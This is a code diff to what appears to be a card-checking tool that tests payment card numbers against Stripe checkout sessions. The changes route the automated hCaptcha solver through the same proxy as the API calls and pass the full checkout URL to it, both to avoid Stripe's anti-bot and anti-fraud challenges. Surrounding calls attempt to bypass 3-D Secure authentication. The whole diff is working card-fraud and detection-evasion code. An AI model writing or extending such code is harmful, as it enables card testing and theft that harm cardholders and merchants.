@@ -217,6 +217,16 @@ async def _fetch_checkout_info(client, checkout_url):
         logger.info(f"Converted /g/pay/ to /c/pay/: {full_url[:80]}...")
 
     logger.info(f"Fetching checkout: url={full_url[:120]}, has_fragment={bool(fragment)}, frag_len={len(fragment)}")
+    # the whole link, the one a person opens in a browser, with the part
+    # after the # on it
+    try:
+        with open("/tmp/stripe_whole_url.txt", "w", encoding="utf-8") as f:
+            f.write(f"{full_url}#{fragment}" if fragment else full_url)
+    except Exception:
+        pass
+    # the whole link, the one a person would open in a browser, with the
+    # part after the # on it: the page needs it to be a whole page
+    whole_url = f"{full_url}#{fragment}" if fragment else full_url
 
     headers = {
         "User-Agent": UA,
@@ -442,6 +452,7 @@ async def _fetch_checkout_info(client, checkout_url):
         "stripe_js_version": stripe_js_version,
         "billing_required": billing_required,
         "customer_email": customer_email,
+        "whole_url": whole_url,
     }, None
 
 
@@ -573,7 +584,8 @@ US_STREETS = [
 async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                                      cc=None, mm=None, yy=None, cvv=None,
                                      stripe_js_version=None, billing_required=False,
-                                     customer_email=None, session_info=None):
+                                     customer_email=None, session_info=None,
+                                     proxy=None):
     headers = {
         "User-Agent": UA,
         "Content-Type": "application/x-www-form-urlencoded",
@@ -903,7 +915,7 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                 except Exception as e:
                     logger.warning(f"Failed to fetch full PI: {e}")
             logger.info(f"PI requires 3DS, attempting bypass...")
-            bypass_result = await _attempt_3ds_bypass(client, pk, pi, "payment_intent", stripe_js_version, is_checkout=True, session_id=session_id, amount=amount, cc=cc, mm=mm, yy=yy, cvv=cvv)
+            bypass_result = await _attempt_3ds_bypass(client, pk, pi, "payment_intent", stripe_js_version, is_checkout=True, session_id=session_id, amount=amount, cc=cc, mm=mm, yy=yy, cvv=cvv, proxy=proxy)
             if bypass_result:
                 return bypass_result
             _pi_sdk_type = pi.get("next_action", {}).get("use_stripe_sdk", {}).get("type", "")
@@ -979,7 +991,7 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                 except Exception as e:
                     logger.warning(f"Failed to fetch full SI: {e}")
             logger.info(f"SI requires 3DS, attempting bypass...")
-            bypass_result = await _attempt_3ds_bypass(client, pk, si, "setup_intent", stripe_js_version, is_checkout=True, session_id=session_id, amount=amount, cc=cc, mm=mm, yy=yy, cvv=cvv)
+            bypass_result = await _attempt_3ds_bypass(client, pk, si, "setup_intent", stripe_js_version, is_checkout=True, session_id=session_id, amount=amount, cc=cc, mm=mm, yy=yy, cvv=cvv, proxy=proxy)
             if bypass_result:
                 return bypass_result
             _si_sdk = si.get("next_action", {}).get("use_stripe_sdk", {})
@@ -1038,7 +1050,7 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
     return "declined", "Unknown response"
 
 
-async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_version=None, is_checkout=False, session_id=None, amount=None, cc=None, mm=None, yy=None, cvv=None):
+async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_version=None, is_checkout=False, session_id=None, amount=None, cc=None, mm=None, yy=None, cvv=None, proxy=None):
     cs = intent_data.get("client_secret", "")
     intent_id = intent_data.get("id", "")
     pm = intent_data.get("payment_method") or intent_data.get("source")
@@ -1303,13 +1315,21 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                 # minutes: the payment intent keeps saying it needs a
                 # challenge.
                 captcha_token = None
-                captcha_page = (f"https://checkout.stripe.com/c/pay/{session_id}?client_secret={cs}"
-                                if session_id else "")
+                # the page a person would open, with the part after the
+                # # on it: without it the page is not a whole page and
+                # stripe puts up the picture challenge instead of the box
+                captcha_page = (session_info or {}).get("whole_url", "") or ""
+                if not captcha_page:
+                    captcha_page = (f"https://checkout.stripe.com/c/pay/{session_id}"
+                                    f"?client_secret={cs}" if session_id else "")
                 captcha_ekey = ""
                 try:
                     from captcha_solver import solve_hcaptcha_enterprise
+                    # the browser goes out the same way as the api, so
+                    # hCaptcha sees one address and not two
                     captcha_token = await solve_hcaptcha_enterprise(
-                        site_key, captcha_page, rqdata=rqdata, session=client)
+                        site_key, captcha_page, rqdata=rqdata, session=client,
+                        proxy=proxy)
                     try:
                         from local_hcaptcha_solver import LAST_EKEY
                         captcha_ekey = LAST_EKEY or ""
@@ -2470,6 +2490,9 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
                 billing_required=info.get("billing_required", False),
                 customer_email=info.get("customer_email"),
                 session_info=info,
+                # the browser that solves the captcha goes out the same
+                # way as the api, so hCaptcha sees one address and not two
+                proxy=client_kwargs.get("proxy"),
             )
             return result
 
